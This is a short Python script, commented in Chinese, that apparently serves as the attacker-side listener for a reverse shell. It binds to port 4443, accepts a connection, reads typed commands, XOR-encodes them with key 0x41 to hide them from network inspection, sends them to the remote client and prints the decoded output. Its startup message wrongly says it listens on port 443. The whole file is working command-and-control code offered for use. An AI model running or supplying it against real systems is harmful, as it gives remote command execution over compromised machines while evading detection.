import socket 
 
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 4443))
s.listen(2)
print ("Listening on port 443... ")
(client, (ip, port)) = s.accept()
print (" Received connection from : ", ip)
 
while True:
 command = input('~$ ')
 encode_data = bytearray(command,encoding='utf-8')

 #将输入的命令编码，密钥为0x41
 for i in range(len(encode_data)):
   encode_data[i] ^=0x41

 #发送命令
 client.send(encode_data)
 #接收
 encode_data=client.recv(2048)
 #  print('encode：',encode_data)
 #  print('encode：',type(encode_data)) ''' <class 'bytes'>'''字节串
 #接收之后转换byte格式
 decode = bytearray(encode_data)
 #print('decode：',decode)
 #print('decode：',type(decode)) '''<class 'bytearray'>'''字节数组
 #解码
 for i in range(len(decode)):
   decode[i] ^=0x41
 #打印回显
 print (decode)
 
client.close()
s.close()